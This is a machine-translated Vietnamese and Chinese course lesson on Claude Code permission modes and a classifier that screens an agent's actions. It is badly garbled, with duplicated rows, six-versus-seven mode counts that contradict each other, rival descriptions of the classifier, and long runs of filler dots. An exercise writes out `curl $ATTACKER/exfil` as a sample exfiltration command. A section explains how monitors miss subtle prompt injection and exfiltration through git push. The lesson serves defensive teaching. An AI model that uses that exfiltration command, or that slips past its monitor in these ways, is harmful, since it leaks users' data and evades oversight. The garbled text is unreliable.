# Claude Code như một đại lý tự trị: chế độ quyền và chế độ tự động
# Các chế độ cho phép cho các đại lý tự trị

> Một bậc thang cho phép  mức độ tự trị từ xem xét-mỗi hành động để phê duyệt-mọi thứ  là cách một vòng xoáy điều khiển những gì một đại lý tự trị có thể làm mà không hỏi. Claude Code, ví dụ làm việc của bài học này, cho thấy sáu chế độ như vậy: "kế hoạch" hỏi trước mỗi hành động, "đặc định" (được dán nhãn "Hướng dẫn" trong UI) chỉ yêu cầu những hành động có rủi ro, "tự động chấp nhận Edit" ghi lại file nhưng vẫn xác nhận việc thực hiện shell, và "bypassPermissions" chấp nhận mọi thứ. Chế độ tự động  `auto`chế độ cho phép thay thế cho việc chấp thuận mỗi hành động bằng một mô hình phân loại riêng biệt xem xét từng hành động trước khi nó chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu của yêu cầu.`max_turns`và `max_budget_usd`. Sự sẵn có của `auto`phụ thuộc vào kế hoạch, kích hoạt, mô hình và nhà cung cấp  và Anthropic rõ ràng rằng phân loại không đủ một mình.

> **【中文解读】**Claude Code 暴露七个权限模式──" kế hoạch" 每动作前询问,"默认" 仅对危险动作询问,"接受Edits" 自动批准文件写入但仍确认 shell 执行,"bypassPermissions" 批准一切──Auto Mode(2026年3月24日) 用两阶段并行安全分类器替代每动作审核:每动作运行单代币 快速检查;标记动作发发思链深度审查──动作预算通过`max_turns`和 `max_budget_usd`实施──Auto Mode 作为研究预览发布Anthropic 明确声明分类器单独不充分──

> **【拓展：权限阶梯 → 安全分级】**Bảy mô hình của Claude Code là "đường tự chủ": kế hoạch → mặc định → chấp nhậnEdits → ... → bỏ quaTrả phép. Mỗi mô hình là tốc độ và trọng lượng khác nhau của mỗi động tác kiểm tra.

>  **【前置】**学本节前请先掌握:Phase 15·01(Long-Horizon Agents) 理解为什么长程 代理 需要权限系统;Phase 14·27(Prompt Injection Defense) 理解为什么 代理 看到的内容不能全信──本节直接讲克劳德码的实际权限模式,是最贴近日常使用的代理安全课──

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## Vấn đề  vấn đề giới thiệu

> **【中文解读】**Mô hình quyền hạn của Claude Code là một ví dụ điển hình của kiểm soát an ninh của đại lý.

> **【拓展：claude code permission modes】**Thiết kế quyền của Claude Code thể hiện thực hành tốt nhất an ninh của Agent năm 2026编码.

Một nhân viên lập mã tự trị trên máy của bạn là một loại bảo mật riêng biệt.

> Máy tính tự lập mã trên máy tính của bạn là một loại bảo mật độc đáo.

Mối tấn công là tất cả mọi thứ mà người dùng có thể truy cập  hệ thống tập tin, mạng, thông tin tín dụng, bảng ghi nhớ, bất kỳ tab trình duyệt nào, bất kỳ thiết bị kết thúc nào mở. Bruce Schneier và những người khác đã đánh dấu công khai điều này: các đại lý sử dụng máy tính không phải là "sự cập nhật tính năng" của chatbot, họ là một loại công cụ mới với một loại hình hồ sơ rủi ro mới.

> 攻击面是 Agent 能触及一切文件系统,网络,凭证,剪贴板,任何浏览器标签,任何打开的终端.

Hệ thống quyền phép của Claude Code là câu trả lời của Anthropic. Thay vì một chuyển đổi "tự trị / không tự trị", có sáu chế độ trải dài một dãy khả năng: kế hoạch → mặc định → chấp nhậnEdits → ... → bypassPermissions. Mỗi chế độ là một sự thỏa hiệp khác nhau giữa tốc độ và xem xét mỗi hành động. Chế độ tự động (March 2026) thêm một mô hình phân loại riêng biệt làm việc chuyển sự chấp thuận khỏi con đường quan trọng của người dùng: nó xem xét từng hành động trước khi nó chạy và chặn bất cứ điều gì leo thang vượt quá yêu cầu.

> Hệ thống quyền hạn của Claude Code là câu trả lời của Anthropic. Không phải là một khóa "tự trị/không tự trị", mà là trải qua các bậc thang của bảy mô hình: kế hoạch → mặc định → chấp nhậnEdits → ... → bỏ quaTrả phép. Mỗi mô hình là tốc độ và trọng lượng khác nhau của mỗi động thái kiểm tra.

>  **【类比】**Claude Code 权限模式 = 银行卡额度阶梯。(1) **plan**= 每笔交易都打电话问你;(2) **default**=                                                                                                                                                                                                                                                               **acceptEdits**= 储蓄卡(消费自动,转账问);(4) **bypassPermissions (YOLO)**• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • •

> ️ **【易错点】**Claude Code 权限的 3 个致命错误:(1) **本机用 bypassPermissions** Một tiêm nhanh 就能 rm -rf /; chỉ trong không nhạy cảm tạm thời容器用。(2) **没设 max_budget_usd**Một vòng chạy bay 1 giờ đốt 50 đô la; cần thiết thiết thiết lập`max_budget_usd=5`起步──(3) **完全信任 Auto Mode 分类器**Anthropic 明确说"分类器单独不充分";高危操作(rm、转账、发邮件) phải được xác nhận hai lần, ngay cả khi分类器说安全──


> **【中文解读】**Bài này giới thiệu khái niệm và phương pháp thực hiện cốt lõi của AI Agent.

Câu hỏi kỹ thuật: hệ thống này bắt được gì, nó bỏ lỡ gì, và chế độ nào thực sự đảm bảo một nhiệm vụ nhất định?

> 工程问题:This system capture what? 遗漏 what? 给定任务实际适合哪个模式?

## Khái niệm cốt lõi

### 7 chế độ quyền phép.
### 6 chế độ cho phép

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Tên trên phù hợp với tài liệu Claude Code công cộng; nhãn UI `default`như "Hướng dẫn")

> (上述名称匹配公开 Claude Code 文档;"yolo" là một viết tắt không chính thức của宽松中间地带.

### Chế độ tự động trong một trang

Chế độ tự động (được ra mắt ngày 24 tháng 3 năm 2026) là chế độ cho phép đầu tiên để ủy quyền phê duyệt mỗi hành động cho một mô hình.

> Auto Mode (từ tháng 3 đến ngày 24 tháng 3 năm 2026) là chế độ quyền hạn đầu tiên được ủy quyền cho mỗi động tác phê duyệt mô hình.

Cấu trúc:

> 结构:

1. **Stage 1 — single-token classifier.**chạy trên mọi hành động đề xuất. rẻ. trả về "an toàn" hoặc "bộ cờ". Được thiết kế để chạy song song với vòng tròn đại lý chính để các hành động được phê duyệt không ngồi trong hàng.
   Trung ngữ翻译:**阶段 1——单 token 分类器。**Trong mỗi đề xuất động hành trên hành trình.
2. **Stage 2 — secondary policy/safety review.**Chỉ chạy trên các hành động được đánh dấu. Thực hiện đánh giá chính sách và an toàn tập trung về hành động, tình trạng hiện tại của phiên và nhiệm vụ được tuyên bố. Tăng lên HITL của người dùng nếu sự tin tưởng thấp.
   Trung ngữ翻译:**阶段 2——二级政策/安全审查。**Chỉ trong việc chỉ huy động tác trên hành trình.
1. **A separate classifier model.**Xem xét mọi hành động được đề xuất trước khi nó chạy, đánh giá dựa trên nhiệm vụ được tuyên bố và tình trạng hiện tại của phiên, và chặn bất cứ điều gì leo thang vượt quá yêu cầu. Các hành động bị chặn rơi lại cho người dùng.
2. **Gated availability.**Dù `auto`được cung cấp hoàn toàn phụ thuộc vào kế hoạch, tổ chức cho phép, mô hình, và nhà cung cấp.

Các kiểm soát ngân sách nằm cạnh phân loại:

> 预算 kiểm soát và phân loại:

- `max_turns` tổng số lần lặp lại trong một phiên.
  Trung ngữ翻译:`max_turns`会话总代数──
- `max_budget_usd` Tầu giá trị đô la làm giảm phiên họp.
  Trung ngữ翻译:`max_budget_usd`停止会话的美元上限──
- giới hạn số hành động cho mỗi công cụ (không quá N `WebFetch`gọi điện, vv.).
  Trung文翻译: mỗi工具动作数限制(不超过 N 个 `WebFetch`调用等)

### Hệ thống bắt được gì?

- Đúng cho trước tiêm nhanh vào đầu vào công cụ nơi hướng dẫn tiêm được lập bản đồ đến một hình thức hành động có nguy cơ được biết đến.
  Trung ngữ翻译:直接将提示注入工具输入,注入指示映射到已知危险动作形状──
- Các vòng lặp công cụ lặp lại  trình phân loại có thể thấy hành động N+1 gần giống với hành động N, năm lần liên tiếp.
  Trung ngữ翻译:重复工具循环分类器可见动作 N+1 与动作 N 几乎相同,连续五次。
- Rõ ràng là ngoài phạm vi của lệnh shell trên một phiên chỉ chỉnh sửa tập tin.
  Trung ngữ翻译: trong chỉ tài liệu 编辑会话 rõ ràng vượt ra ngoài phạm vi của shell 命令。

### Hệ thống có thể bỏ qua những gì

- **Subtle prompt injection**Điều này có thể được thực hiện bằng cách tạo ra một hành động được đánh dấu.
  Trung ngữ翻译:**微妙提示注入** Trong trường hợp không có hoạt động chỉ dấu đơn lẻ, điều chỉnh hành vi.
- **Semantic-level misbehavior.**Mỗi hành động cá nhân có thể trông an toàn trong khi quỹ đạo được tạo thành là có hại.
  Trung ngữ翻译:**语义级不当行为。**Mỗi động tác độc lập trông an toàn và kết hợp các quỹ đạo có hại.
- **Exfiltration through legitimate channels.**Sau đó, bạn sẽ viết dữ liệu vào một tập tin mà bạn sở hữu.`git push`Một số hành động được phép được thực hiện theo chuỗi các quy trình của các công ty.
  Trung ngữ翻译:**通过合法渠道泄露。**写数据到你拥有的文件,然后 `git push`Đến kho công cộng, là phép hoạt động, sự kết hợp của nó là vấn đề.

### Research preview frame

Anthropic đã đưa ra chế độ tự động như một bản xem trước nghiên cứu. Tài liệu rõ ràng rằng trình phân loại là một lớp, không phải là một giải pháp: người dùng được kỳ vọng kết hợp chế độ tự động với ngân sách, danh sách cho phép, không gian làm việc riêng biệt và kiểm toán quỹ đạo (Dạy học 1216). Các khung xem trước cũng phản ánh khoảng cách đánh giá chống triển khai được ghi chép (Dạy 1)  một phân loại vượt qua các đánh giá ngoại tuyến có thể cư xử khác nhau trong một phiên thực khi ngữ cảnh của người dùng là mơ hồ.

> Anthropic 将 Auto Mode 作为研究预览发布.文档明确分类器是一个层而非解决方案: người dùng được kỳ vọng sẽ Auto Mode với ngân sách, cho phép danh sách, phân vùng làm việc, kiểm toán轨迹.

### Khi bậc thang này sống trong dòng chảy công việc của bạn

- Nhiệm vụ không quen thuộc: bắt đầu `plan`Đọc kế hoạch rẻ hơn là quay lại một lần không tốt.
  Trung ngữ翻译:不熟悉任务: 在 `plan`Trung bắt đầu.
- Phân tích được biết đến: `acceptEdits`tiết kiệm rất nhiều click xác nhận.
  Trung ngữ翻译:已知重构:`acceptEdits`省 lượng lớn xác nhận点击.
- Tiếp tục chạy nền không giám sát: `autoMode`Chỉ trong một không gian làm việc mà bán kính nổ bạn đã đo (không có giấy chứng nhận, không có đính kèm sản xuất, không có lối ra bạn không chọn).
  Trung語翻译:无人值守后台运行: chỉ trong khu vực làm việc đã được đo lường`autoMode`(Không có giấy chứng nhận, không có sản xuất được đăng ký, không có xuất khẩu được chọn)
- Các thùng chứa: `yolo`- `bypassPermissions`được chấp nhận nếu và chỉ khi container và giấy chứng nhận của nó được sử dụng một lần.
  Trung文翻译: tạm thời容器:`yolo`- `bypassPermissions`Có thể chấp nhận và chỉ có thể loại bỏ các hộp và chứng chỉ của nó.
- Tiếp tục chạy nền không giám sát: `auto`Chỉ trong một không gian làm việc mà bán kính nổ bạn đã đo (không có giấy chứng nhận, không có đính kèm sản xuất, không có lối ra bạn không chọn).
- Các thùng chứa: `dontAsk`- `bypassPermissions`được chấp nhận nếu và chỉ khi container và giấy chứng nhận của nó được sử dụng một lần.

```figure
autonomy-oversight
```

## Hãy sử dụng nó để thực hiện

`code/main.py`mô phỏng một phân loại đánh giá hành động như một đường ống hai giai đoạn  một đơn giản hóa giảng dạy; thực tế `auto`chế độ được hỗ trợ bởi một mô hình phân loại riêng biệt, không phải là một hợp đồng hai giai đoạn được ghi chép. giai đoạn 1 là một quy tắc từ khóa rẻ hơn các hành động được đề xuất; giai đoạn 2 là một trình xem xét nhiều quy tắc chậm hơn. Người lái xe cung cấp trong một quỹ đạo tổng hợp ngắn (các hành động an toàn, một nỗ lực tiêm nhanh, một vòng lặp lặp lặp) và cho thấy phân loại bắt được và bị bỏ lỡ ở đâu.

> `code/main.py`模拟两阶段分类器──阶段 1 là quy tắc giá rẻ trên động cơ đề xuất;阶段 2 là kiểm tra viên nhiều quy tắc chậm hơn──驱动器进入短合成轨迹(安全动作、提示注入尝试、重复循环)并展示分类器捕获和遗漏的处境──

## Chuyển nó đi.

`outputs/skill-permission-mode-picker.md`phù hợp với mô tả nhiệm vụ với chế độ quyền phù hợp, giới hạn ngân sách và sự cô lập cần thiết.

> `outputs/skill-permission-mode-picker.md`Để mô tả nhiệm vụ phù hợp với mô hình quyền hạn chính xác, giới hạn ngân sách và sự tách biệt cần thiết.

## Tập luyện bài tập

1. Đi chạy`code/main.py`Phụ thể hành động tổng hợp nào không bao giờ được Phase 1 đánh dấu nhưng luôn bị Phase 2 đánh dấu?
   Trung ngữ翻译:运行 `code/main.py` loại động cơ tổng hợp nào không được đánh dấu trong giai đoạn 1 nhưng được thu thập trong giai đoạn 2?

2. Lợi ích của các phương pháp này là:`curl $ATTACKER/exfil`(b) đo tỷ lệ dương tính sai trên mẫu tác dụng lành tính.
   Trung文翻译:扩展阶段 1 规则集以捕获特定已知坏形状 (nói:                                                                                                                                                                                                                                                  `curl $ATTACKER/exfil`(■)                                                                                                                                                                                                                                                              

3. Đọc tài liệu "How the agent loop works" của Anthropic.`default`Mode. Bạn cần phải cổng riêng biệt trước khi chạy`autoMode`không có người giám sát?
   中文翻译:阅读 Anthropic 的"Làm thế nào vòng lặp đại lý hoạt động"文档──列出 `default`模式下 Agent 默认触及的每个外部状态――无人值守运行 `autoMode`Trước tiên cần kiểm soát riêng điều gì?
3. Đọc tài liệu "How the agent loop works" của Anthropic.`default`Mode. Bạn cần phải cổng riêng biệt trước khi chạy`auto`không có người giám sát?

4. Thiết kế ngân sách hoạt động 24 giờ không giám sát: `max_turns`- `max_budget_usd`, mỗi công cụ, các con số, biện minh cho mỗi số.
   Trung ngữ翻译:设计 24 小时无人值守运行预算:`max_turns``max_budget_usd`、 mỗi công cụ trên giới hạn、 cho phép danh sách──论证每个数字──

5. Mô tả một quỹ đạo mà mỗi hành động được phê duyệt bởi giai đoạn 1 và giai đoạn 2, nhưng hành vi được tạo thành không phù hợp. (Dạy học 14 bao gồm cách các chuyển đổi giết người và mã thông báo canary giải quyết vấn đề này.)
   Trung ngữ翻译:描述一条轨迹,每个单独动作都被阶段 1 和阶段 2 批准,但组合行为不对齐.
5. Mô tả một quỹ đạo mà mỗi hành động được phân loại chấp thuận bởi bộ phân loại, nhưng hành vi được tạo thành không phù hợp. (Dạy học 14 bao gồm cách các chuyển đổi giết người và mã thông báo canary giải quyết vấn đề này).

## Từ khóa  Từ khóa nhanh chóng

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Xem thêm 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) Các chế độ cho phép, ngân sách, định dạng hành động.
  Trung ngữ翻译:权限模式、预算、动作格式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Mô hình thực hiện dịch vụ quản lý
  Trung ngữ翻译:管理服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) tính năng bề mặt và thông báo chế độ tự động.
  Trung ngữ翻译:功能面和 Auto Mode 公告──
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) lớp dựa trên lý do tạo ra các phán quyết phân loại.
  Trung ngữ翻译:塑造分类器判断的基于推理的层――
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Quan điểm nội bộ về thiết kế giấy phép đường dài.
  Trung ngữ翻译:长程权限设计的内部视角──
